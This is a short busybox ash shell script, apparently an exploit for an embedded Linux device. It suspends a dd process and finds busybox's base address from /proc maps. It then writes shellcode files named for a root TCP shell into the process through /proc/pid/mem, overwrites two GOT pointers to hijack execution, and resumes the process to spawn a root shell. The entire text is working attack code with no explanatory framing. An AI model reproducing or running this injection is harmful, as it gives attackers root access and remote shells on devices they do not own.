#!/bin/ash
p=
/bin/dd if=/dev/zero of=/dev/null bs=4096 &
p=$!
/bin/sleep 1
kill -STOP "$p"
base=$(/usr/bin/awk '$6=="/bin/busybox"&&$3=="00000000"{split($1,a,"-");print a[1];exit}' /proc/$p/maps)
image=$((0x$base+0x74000))
rgot=$((0x$base+0x8fb08))
wgot=$((0x$base+0x8fdf4))
/bin/dd if=/tmp/root_tcp_shell.bin of=/proc/$p/mem bs=1 seek=$image conv=notrunc
/bin/dd if=/tmp/root_shell_bootstrap.bin of=/proc/$p/mem bs=1 seek=$image conv=notrunc
printf "\\$(printf %03o $((image&255)))\\$(printf %03o $(((image>>8)&255)))\\$(printf %03o $(((image>>16)&255)))\\$(printf %03o $(((image>>24)&255)))" >/tmp/root_shell_pointer.bin
/bin/dd if=/tmp/root_shell_pointer.bin of=/proc/$p/mem bs=1 seek=$rgot conv=notrunc
/bin/dd if=/tmp/root_shell_pointer.bin of=/proc/$p/mem bs=1 seek=$wgot conv=notrunc
kill -CONT "$p"
/bin/ash /tmp/root-file-shell.sh &
